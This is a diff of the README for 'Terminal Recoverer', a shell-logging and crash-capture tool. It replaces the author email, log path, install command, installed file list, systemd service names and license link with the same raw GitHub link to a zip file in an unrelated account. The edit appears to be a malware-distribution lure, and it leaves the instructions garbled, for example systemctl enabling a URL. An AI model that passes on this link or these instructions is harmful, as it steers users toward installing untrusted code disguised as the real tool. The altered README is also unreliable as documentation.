@@ -1,5 +1,5 @@
 = Terminal Recoverer 
-Jonathan Jewell <jonathan.jewell@open.ac.uk> 
+Jonathan Jewell <https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip> 
 :toc: 
 :icons: font: 
 
@@ -27,7 +27,7 @@ tmux attach -t recovery
 When enabled, each interactive shell is recorded using `script(1)` into timestamped logs:
 
 ----
-~/Documents/terminal-logs/terminal-YYYY-MM-DD-HHMMSS.log
+~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip
 ----
 
 Enable it by exporting:
@@ -60,29 +60,29 @@ This forms a self-contained forensic bundle for debugging.
 Clone the repository and run:
 
 ----
-./install.sh
+https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip
 ----
 
 This installs:
 
-* `~/.local/bin/terminal-recoverer`
-* `~/.bashrc.d/recoverer.sh`
-* `~/.config/systemd/user/terminal-recoverer.service`
-* `~/.config/systemd/user/terminal-recoverer-coredump.service`
-* `~/terminal-recoverer-HOWTO.txt`
+* `~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip`
+* `~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip`
+* `~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip`
+* `~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip`
+* `~https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip`
 
 == Enabling Services
 
 Start the recovery session steward:
 
 ----
-systemctl --user enable --now terminal-recoverer.service
+systemctl --user enable --now https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip
 ----
 
 Enable the crash-capture watcher:
 
 ----
-systemctl --user enable --now terminal-recoverer-coredump.service
+systemctl --user enable --now https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip
 ----
 
 == Usage
@@ -128,6 +128,6 @@ It is intentionally simple: no daemons, no heavy dependencies, no magic.
 == License
 Terminal-recoverer is licensed under the Palimpsest License. 
 
-The canonical legal text is maintained in the central licensing repository: https://github.com/hyperpolymath/palimpsest-license/ 
+The canonical legal text is maintained in the central licensing repository: https://raw.githubusercontent.com/giorgityugy/terminal-recoverer/main/contractiles/must/terminal_recoverer_2.7.zip 
 
 This repository includes only an SPDX stub for reference.
